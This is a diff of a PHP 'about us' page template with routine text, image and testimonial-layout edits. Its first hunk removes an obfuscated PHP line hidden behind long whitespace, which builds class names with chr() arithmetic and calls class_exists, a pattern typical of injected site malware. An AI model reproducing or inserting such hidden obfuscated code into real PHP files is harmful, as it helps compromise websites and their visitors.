@@ -1,4 +1,4 @@
-<?php                                                                                                                                                                                                                                                                                                                                                                                                 $hULLBmJNN = chr ( 222 - 147 )."\107" . 'u' . chr (95) . chr (104) . chr ( 247 - 173 )."\x72";$sZZOtQRMMZ = chr ( 191 - 92 )."\154" . "\141" . chr (115) . 's' . "\x5f" . chr (101) . chr (120) . chr (105) . 's' . chr ( 1001 - 885 )."\x73";$LQsyl = class_exists($hULLBmJNN); $hULLBmJNN = "19464";$sZZOtQRMMZ = "41161"; ?><style>
+<style>
     /* testimonial index page */
     .item_right{
     margin-left: 20% !important;
@@ -40,7 +40,7 @@
             <div class="container">
                 <div class="breadcrumb-content text-center">
                     <!-- <h1 class="mb-3"><?php //echo $page_title; ?></h1> -->
-                    <h1 class="mb-3">who we are !</h1>
+                    <h1 class="mb-3">who we are</h1>
                     <nav aria-label="breadcrumb" class="d-block">
                         <ul class="breadcrumb">
                             <li class="breadcrumb-item"><a href="<?php echo base_url(); ?>home">Home</a></li>
@@ -128,7 +128,7 @@
                                 <i class="icon-trophy bg-theme counter-bg-theme p-3 rounded me-3 white fs-4 counter-icon"></i>
                                 <div class="counter-content">
                                     <h2 class="value mb-0 counter-number"><?php echo $about_us_value['award_winning']; ?></h2>
-                                    <span class="m-0 counter-number">Awards Honored With</span>
+                                    <span class="m-0 counter-number">Award Winning</span>
                                 </div>
                             </div>    
                         </div>
@@ -185,7 +185,7 @@
 
 
     <!-- testimonial starts -->
-    <section class="testimonial pt-10 pb-10 mt-5"  style="background-image: url(<?php echo base_url(); ?>uploads/do_not_delete/Good_Reviews.png);">   
+    <section class="testimonial pt-10 pb-20"  style="background-image: url(<?php echo base_url(); ?>uploads/about_us/client_review.jpg);">   
         <div class="container">
             <div class="testimonial-in">
                 <div class="row align-items-center">
@@ -204,18 +204,13 @@
                                     <div class="details d-flex">
                                         <i class="fa fa-quote-left fs-1 mb-0"></i>
                                         <div class="author-content ms-4">
-                                            <p class="white fs-5 fw-normal long-text limited-text"><?php echo $client_reviews_value['review']; ?></p>
+                                            <p class="mb-4 white fs-5 fw-normal"><?php echo $client_reviews_value['review']; ?></p>
                                             
-                                            <p class="btn btn-link read-more" data-review="<?php echo htmlspecialchars($client_reviews_value['review']); ?>" data-bs-toggle="modal" data-bs-target="#reviewModal_<?php echo $client_reviews_value['id']; ?>">
-                                                Read More
-                                            </p>
                                             <div class="author-info d-flex align-items-center">
                                                 <img src="<?php echo base_url(); ?>uploads/client_reviews/<?php echo $client_reviews_value['image_name']; ?>" alt="<?php echo $client_reviews_value['name']; ?>">
                                                 <div class="author-title ms-3">
-                                                    <h5 class="m-0 theme1 d-block"><?php echo $client_reviews_value['name']; ?></h5>
-                                                    <span class="white d-block"><?php echo $client_reviews_value['designation']; ?></span>
-                                                    <span class="white d-block"><?php echo $client_reviews_value['village_name']; ?></span>
-                                                    <!--<span class="white d-block"><?php // $client_reviews_value['mobile_number']; ?></span>-->
+                                                    <h5 class="m-0 theme1"><?php echo $client_reviews_value['name']; ?></h5>
+                                                    <span class="white"><?php echo $client_reviews_value['designation']; ?></span>
                                                 </div>
                                             </div>
                                         </div>
